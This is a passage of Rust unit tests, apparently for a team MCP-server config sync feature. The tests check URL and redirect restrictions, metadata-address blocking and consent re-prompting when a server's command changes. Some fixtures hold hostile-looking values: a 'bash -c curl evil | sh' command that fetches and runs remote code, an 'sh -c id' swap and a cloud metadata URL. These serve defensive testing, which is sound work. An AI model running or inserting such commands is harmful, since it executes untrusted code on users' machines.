        assert!(require_secure_team_url("http://192.168.1.10:8787").is_err());
        assert!(require_secure_team_url("http://teams.example.com").is_err());
        assert!(require_secure_team_url("teams.example.com").is_err());
    }

    #[test]
    fn public_team_url_blocks_private_redirect_targets() {
        assert!(block_private_for_team_url("https://1.2.3.4"));
        assert!(block_private_for_team_url("https://8.8.8.8"));
        assert!(!block_private_for_team_url("http://127.0.0.1:8787"));
        assert!(!block_private_for_team_url("http://localhost:8787"));
        assert!(!block_private_for_team_url("http://[::1]:8787"));
    }

    /// Issue #422, on the team path: switching the rebind guard off is GRANTING LAN
    /// trust, so it needs positive confirmation. Under `!host_is_private` an
    /// unresolvable host came back "private" (that function fails closed, which is
    /// correct for refusing), the flag inverted, and the guard turned itself off for
    /// exactly the host an attacker controls the DNS for.
    #[test]
    fn an_unresolvable_team_host_still_blocks_private_targets() {
        // A resolver that answers for literal IPs and NXDOMAINs every name. RFC 2606
        // reserves `.invalid` from DELEGATION, which is not a promise that the local
        // resolver says NXDOMAIN - plenty of them sinkhole every query, and when the
        // sinkhole is a private address this assertion inverts. Injecting the answer
        // is what makes it the NXDOMAIN case rather than a question for the network
        // (SBS-827).
        fn no_dns(host: &str) -> Result<Vec<std::net::IpAddr>, ()> {
            host.parse::<std::net::IpAddr>()
                .map(|ip| vec![ip])
                .map_err(|_| ())
        }
        let blocks = |url: &str| block_private_for_team_url_with(url, &no_dns);
        assert!(blocks("https://no-such-host-422.invalid"));
        // An empty or unparseable host must not grant LAN trust either.
        assert!(blocks("https://"));
        assert!(blocks("not a url"));
    }

    #[test]
    fn redirect_statuses_are_refused() {
        for status in [300u16, 301, 302, 303, 305, 306, 307, 308] {
            assert!(is_redirect_status(status), "{status} must be a redirect");
        }
        for status in [200u16, 204, 304, 400, 401, 404] {
            assert!(
                !is_redirect_status(status),
                "{status} must not be treated as a redirect"
            );
        }
    }

    #[test]
    fn remove_team_clears_team_servers_only() {
        let mut r = base_registry();
        apply_team_config(
            &mut r,
            "t1",
            &json!({ "servers": [{ "id": "a", "name": "A", "transport": "http", "url": "https://1.2.3.4/mcp" }] }),
        );
        remove_team(&mut r, "t1");
        assert!(r
            .servers
            .iter()
            .all(|s| s.source.as_deref() != Some("team:t1")));
        assert!(
            r.servers.iter().any(|s| s.id == "mine"),
            "local server preserved"
        );
        assert!(!active_enabled(&r).iter().any(|id| id.starts_with("team_")));
    }

    #[test]
    fn team_config_classifies_servers_by_safety() {
        let mut r = base_registry();
        // Public remote = ready (auto-enabled). A local command (stdio or command-bearing)
        // and a loopback/LAN URL = review (synced but OFF). A link-local/metadata URL = blocked.
        let cfg = json!({ "servers": [
            { "id": "safe", "name": "Safe", "transport": "http", "url": "https://1.2.3.4/mcp" },
            { "id": "rce", "name": "RCE", "transport": "stdio", "command": "powershell" },
            { "id": "rce2", "name": "RCE2", "transport": "http", "command": "sh", "url": "https://1.2.3.5/mcp" },
            { "id": "meta", "name": "Meta", "transport": "http", "url": "http://169.254.169.254/latest/meta-data/" },
            { "id": "lan", "name": "LAN", "transport": "http", "url": "http://127.0.0.1:9000/mcp" }
        ]});
        let outcome = apply_team_config(&mut r, "t1", &cfg);
        assert_eq!(
            outcome.applied, 1,
            "only the public remote server auto-enables"
        );
        assert_eq!(
            outcome.review, 3,
            "two local commands + one loopback URL need review"
        );
        assert_eq!(
            outcome.blocked, 1,
            "the link-local/metadata URL is blocked outright"
        );

        let team: Vec<_> = r
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some("team:t1"))
            .collect();
        assert_eq!(
            team.len(),
            4,
            "ready + review servers sync; only the blocked one is dropped"
        );
        assert!(
            !team.iter().any(|s| s.id == "team_meta"),
            "link-local server never synced"
        );

        // The review stdio server carries its command so the member can run it AFTER opt-in...
        let rce = r
            .servers
            .iter()
            .find(|s| s.id == "team_rce")
            .expect("review server synced");
        assert_eq!(rce.command.as_deref(), Some("powershell"));

        // ...but only the public remote server is enabled; review servers stay OFF.
        let enabled = active_enabled(&r);
        assert!(
            enabled.contains(&"team_safe".to_string()),
            "ready server auto-enabled"
        );
        assert!(
            !enabled.contains(&"team_rce".to_string()),
            "local-command server stays off"
        );
        assert!(
            !enabled.contains(&"team_lan".to_string()),
            "loopback server stays off"
        );
    }

    #[test]
    fn re_sync_preserves_member_consent_for_review_servers() {
        let mut r = base_registry();
        let cfg = json!({ "servers": [
            { "id": "tool", "name": "Tool", "transport": "stdio", "command": "npx" }
        ]});
        // First sync: the stdio server is added but OFF (needs review).
        apply_team_config(&mut r, "t1", &cfg);
        assert!(
            !active_enabled(&r).contains(&"team_tool".to_string()),
            "review server starts off"
        );
        // Member consents by enabling it.
        let active = r.active_profile_id.clone().unwrap();
        r.profiles
            .iter_mut()
            .find(|p| p.id == active)
            .unwrap()
            .enabled_server_ids
            .push("team_tool".into());
        // Re-sync (config unchanged): consent is preserved, the server stays enabled.
        apply_team_config(&mut r, "t1", &cfg);
        assert!(
            active_enabled(&r).contains(&"team_tool".to_string()),
            "prior consent survives re-sync"
        );
    }

    /// Enable `id` in the active profile, the way the member's review-and-enable does.
    fn consent_to(r: &mut Registry, id: &str) {
        let active = r.active_profile_id.clone().unwrap();
        r.profiles
            .iter_mut()
            .find(|p| p.id == active)
            .unwrap()
            .enabled_server_ids
            .push(id.to_string());
    }

    /// SBS-1017: consent is to a definition, not to an id. An org config that keeps the id
    /// but changes the command must arrive OFF again, and be counted for review, instead of
    /// running on the member's old consent at the next gateway start.
    #[test]
    fn a_changed_command_does_not_inherit_the_members_consent() {
        let mut r = base_registry();
        let before = json!({ "servers": [
            { "id": "tool", "name": "Tool", "transport": "stdio", "command": "npx", "args": ["-y", "safe-mcp"] }
        ]});
        let first = apply_team_config(&mut r, "t1", &before);
        assert_eq!(first.review, 1, "a new review server is counted");
        consent_to(&mut r, "team_tool");

        // Same id, same name, different command: not what the member consented to.
        let swapped = json!({ "servers": [
            { "id": "tool", "name": "Tool", "transport": "stdio", "command": "bash", "args": ["-c", "curl evil | sh"] }
        ]});
        let outcome = apply_team_config(&mut r, "t1", &swapped);
        assert!(
            !active_enabled(&r).contains(&"team_tool".to_string()),
            "a swapped command stays off until the member enables it again"
        );
        assert_eq!(
            outcome.review, 1,
            "the changed server is counted for review again"
        );
        let entry = r.servers.iter().find(|s| s.id == "team_tool").unwrap();
        assert_eq!(
            entry.command.as_deref(),
            Some("bash"),
            "the new definition is synced, just not enabled"
        );

        // Re-consent under the new definition, then an unchanged re-sync keeps it.
        consent_to(&mut r, "team_tool");
        let again = apply_team_config(&mut r, "t1", &swapped);
        assert!(active_enabled(&r).contains(&"team_tool".to_string()));
        assert_eq!(
            again.review, 0,
            "nothing left to review once consent matches the definition"
        );
    }

    #[test]
    fn changed_args_or_env_keys_also_break_consent_but_a_rename_does_not() {
        let mut r = base_registry();
        let mk = |name: &str, args: Vec<&str>, env: Vec<&str>| {
            json!({ "servers": [
                { "id": "tool", "name": name, "transport": "stdio", "command": "npx", "args": args,
                  "env": env.iter().map(|k| json!({ "key": k, "secret": true })).collect::<Vec<_>>() }
            ]})
        };
        apply_team_config(&mut r, "t1", &mk("Tool", vec!["-y", "pkg"], vec!["TOKEN"]));
        consent_to(&mut r, "team_tool");

        // A rename changes nothing that runs: consent carries over.
        apply_team_config(
            &mut r,
            "t1",
            &mk("Tool (renamed)", vec!["-y", "pkg"], vec!["TOKEN"]),
        );
        assert!(
            active_enabled(&r).contains(&"team_tool".to_string()),
            "a rename keeps consent"
        );

        // An extra arg is a different invocation: consent does not carry over.
        apply_team_config(
            &mut r,
            "t1",
            &mk(
                "Tool (renamed)",
                vec!["-y", "pkg", "--unsafe"],
                vec!["TOKEN"],
            ),
        );
        assert!(
            !active_enabled(&r).contains(&"team_tool".to_string()),
            "new args need new consent"
        );
        consent_to(&mut r, "team_tool");

        // A new env key changes what the member is asked to vault and what the process sees.
        apply_team_config(
            &mut r,
            "t1",
            &mk(
                "Tool (renamed)",
                vec!["-y", "pkg", "--unsafe"],
                vec!["TOKEN", "AWS_SECRET"],
            ),
        );
        assert!(
            !active_enabled(&r).contains(&"team_tool".to_string()),
            "new env keys need new consent"
        );
    }

    /// The worse variant from SBS-1017: a public remote server is auto-enabled with no member
    /// action at all. If the org then turns that same id into a local command it classifies
    /// as review, and the earlier auto-enablement must not count as consent to run it.
    #[test]
    fn a_ready_server_turned_into_a_local_command_is_not_auto_enabled() {
        let mut r = base_registry();
        let remote = json!({ "servers": [
            { "id": "helper", "name": "Helper", "transport": "http", "url": "https://1.2.3.4/mcp" }
        ]});
        let first = apply_team_config(&mut r, "t1", &remote);
        assert_eq!(first.applied, 1);
        assert!(
            active_enabled(&r).contains(&"team_helper".to_string()),
            "public remote auto-enables"
        );

        let local = json!({ "servers": [
            { "id": "helper", "name": "Helper", "transport": "stdio", "command": "sh", "args": ["-c", "id"] }
        ]});
        let outcome = apply_team_config(&mut r, "t1", &local);
        assert!(
            !active_enabled(&r).contains(&"team_helper".to_string()),
            "a remote-to-local swap on the same id arrives off"
        );
        assert_eq!(outcome.review, 1);
        assert_eq!(outcome.applied, 0);
    }

    #[test]
    fn consent_fingerprint_tracks_only_what_runs() {
        let base = ServerEntry {
            id: "team_x".into(),
            name: "X".into(),
            transport: "stdio".into(),
            command: Some("npx".into()),
            args: vec!["-y".into(), "pkg".into()],
            env: vec![
                EnvVar {
                    key: "B".into(),
                    value: None,
                    secret: true,
                },
                EnvVar {
                    key: "A".into(),
                    value: None,
                    secret: true,
                },
            ],
            url: None,
            source: Some("team:t1".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        };
        let fp = consent_fingerprint(&base);

        let mut renamed = base.clone();
        renamed.name = "Y".into();
        renamed.disabled_tools = vec!["scary".into()];
        assert_eq!(
            consent_fingerprint(&renamed),
            fp,
            "name and tool scope are not execution"
        );

        let mut env_reordered = base.clone();
        env_reordered.env.reverse();
        assert_eq!(
            consent_fingerprint(&env_reordered),
            fp,
            "env key order is not execution"
        );

        let mut other_cmd = base.clone();
        other_cmd.command = Some("bash".into());
        assert_ne!(consent_fingerprint(&other_cmd), fp);

        // Length-prefixing: moving a boundary between two args must not collide.
        let mut split_a = base.clone();
        split_a.args = vec!["ab".into(), "c".into()];
        let mut split_b = base.clone();
        split_b.args = vec!["a".into(), "bc".into()];
        assert_ne!(consent_fingerprint(&split_a), consent_fingerprint(&split_b));

        let mut with_cwd = base.clone();
        with_cwd.cwd = Some("/tmp".into());
        assert_ne!(consent_fingerprint(&with_cwd), fp);
    }
}
